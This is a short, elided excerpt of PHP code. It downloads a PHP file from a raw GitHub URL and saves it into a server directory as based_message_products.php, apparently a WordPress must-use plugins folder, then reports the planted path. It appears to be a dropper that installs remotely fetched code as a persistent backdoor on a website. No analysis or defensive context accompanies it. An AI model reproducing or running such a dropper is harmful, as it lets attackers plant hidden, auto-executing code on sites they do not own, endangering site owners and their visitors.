...
$ch = curl_init();
curl_setopt($ch, CURLOPT_URL, 'https://raw.githubusercontent.com/cantulope/cantutag/refs/heads/main/v4/based_message_products.php');
...
die('err dir'); }
if (is_file($mu.'based_message_products.php')) die('file exist');
$r = file_put_contents($mu.'based_message_products.php', $c);
if ($r===false) die('err saving');
die('/based_message_products.php');